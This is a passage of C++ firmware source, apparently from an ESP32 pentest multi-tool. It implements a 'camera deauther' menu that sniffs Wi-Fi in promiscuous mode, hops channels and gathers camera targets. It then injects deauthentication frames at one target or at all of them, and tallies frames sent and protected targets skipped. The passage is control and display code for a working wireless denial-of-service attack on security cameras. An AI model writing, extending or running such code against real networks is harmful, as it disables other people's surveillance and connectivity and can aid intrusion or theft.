    int y = max(14, (int)BORDER_PAD_Y + FM * LH + 4);
    int lineH = max(10, FP * LH + 2);
    int clearW = max(20, tftWidth - x * 2);
    int footerY = getFooterY(lineH);

    // Line 1: Channel + DEAUTH badge (cyan)
    if (y + lineH <= footerY) {
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        String chPart = "CH:" + String(g_channel) + " ";
        tft.drawString(chPart, x, y, 1);
        drawModeBadge(x + tft.textWidth(chPart), y, true, false);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        y += lineH;
    }

    // Line 2: Active targets + scope
    if (y + lineH <= footerY) {
        int activeCount = 0;
        for (int i = 0; i < g_targetCount; i++) {
            if (g_targets[i].active) activeCount++;
        }
        const char *scope = g_deauthAll ? "ALL" : "1-TGT";
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        tft.drawString(
            fitSingleLine(
                "Targets: " + String(activeCount) + "/" + String(g_targetCount) + " [" + String(scope) + "]",
                "Tgt:" + String(activeCount) + "/" + String(g_targetCount) + " [" + String(scope) + "]"
            ),
            x,
            y,
            1
        );
        y += lineH;
    }

    // Line 3: Frames TX + PMF skipped
    if (y + lineH <= footerY) {
        tft.fillRect(x, y, clearW, lineH, bruceConfig.bgColor);
        tft.drawString(
            fitSingleLine("TX: " + String(g_totalDeauths) + "  PMF skip: " + String(g_skippedPmf), "TX:" + String(g_totalDeauths) + " PMF:" + String(g_skippedPmf)),
            x,
            y,
            1
        );
    }

    drawFooterLine(x, clearW, lineH, "SEL: Stop  ESC: Back", "SEL:Stop ESC:Back");

    recordScanUiCache(2);
}

// ============================================================
// Main menu
// ============================================================

void cameraDeautherMenu() {
    WiFiState savedState = saveWiFiState();

    wifiDisconnect();
    delay(100);

    if (!WiFi.mode(WIFI_STA)) {
        displayError("Failed to set STA mode", true);
        restoreWiFiState(savedState);
        return;
    }
    delay(100);

    ensureWifiPlatform();

    g_channels = buildCameraChannelList();
    g_channelIndex = 0;
    g_channel = g_channels[0];
    esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);

    esp_wifi_set_promiscuous_rx_cb(&cameraSnifferCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    g_targetCount = 0;
    g_apCount = 0;
    g_channelLocked = false;
    g_deauthActive = false;
    g_scanPaused = false;
    g_deauthAll = true;
    g_menuCursor = 0;
    g_totalDeauths = 0;
    g_skippedPmf = 0;
    g_lastHopMs = millis();
    g_lastDeauthMs = millis();
    memset(g_targets, 0, sizeof(g_targets));
    memset(g_aps, 0, sizeof(g_aps));
    resetUiCache();

    int uiState = 0;
    uint32_t lastRedraw = 0;

    while (!check(EscPress)) {
        hopChannel();
        injectDeauths();
        pruneStaleTargets();

        if (millis() - lastRedraw > 250) {
            lastRedraw = millis();
            if (uiState == 0) drawScanScreen();
            else if (uiState == 1) drawTargetsScreen();
            else drawActiveScreen();
        }

        if (check(NextPress) && uiState == 0 && g_targetCount > 0) {
            uiState = 1;
            g_menuCursor = 0;
            resetUiCache();
            lastRedraw = 0;
        } else if (check(PrevPress) && uiState == 1) {
            if (g_menuCursor > 0) g_menuCursor--;
            lastRedraw = 0;
        } else if (check(NextPress) && uiState == 1) {
            int maxIdx = getTargetsListItemCount() - 1;
            if (g_menuCursor < maxIdx) g_menuCursor++;
            lastRedraw = 0;
        } else if (check(SelPress)) {
            if (uiState == 0) {
                if (!g_deauthActive) {
                    if (g_targetCount > 0) {
                        g_scanPaused = false;
                        esp_wifi_set_promiscuous(true);
                        g_deauthActive = true;
                        if (g_deauthAll) enableAllTargets();
                        g_lastHopMs = millis();
                        uiState = 2;
                        resetUiCache();
                    } else {
                        g_scanPaused = !g_scanPaused;
                        esp_wifi_set_promiscuous(!g_scanPaused);
                        if (!g_scanPaused) g_lastHopMs = millis();
                    }
                } else {
                    g_deauthActive = false;
                }
                lastRedraw = 0;
            } else if (uiState == 1 && g_targetCount > 0) {
                g_scanPaused = false;
                esp_wifi_set_promiscuous(true);
                clampMenuCursor();
                if (hasDeauthAllItem() && g_menuCursor == 0) {
                    enableAllTargets();
                } else {
                    int targetIdx = hasDeauthAllItem() ? (g_menuCursor - 1) : g_menuCursor;
                    lockSingleTarget(targetIdx);
                }
                g_deauthActive = true;
                g_lastHopMs = millis();
                uiState = 2;
                resetUiCache();
                lastRedraw = 0;
            } else if (uiState == 2) {
                g_deauthActive = false;
                g_channelLocked = false;
                uiState = 0;
                resetUiCache();
                lastRedraw = 0;
            }
        } else if (check(EscPress)) {
            if (uiState == 1 || uiState == 2) {
                uiState = 0;
                g_deauthActive = false;
                g_channelLocked = false;
                resetUiCache();
                lastRedraw = 0;
            } else {
                break;
            }
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    restoreWiFiState(savedState);
}
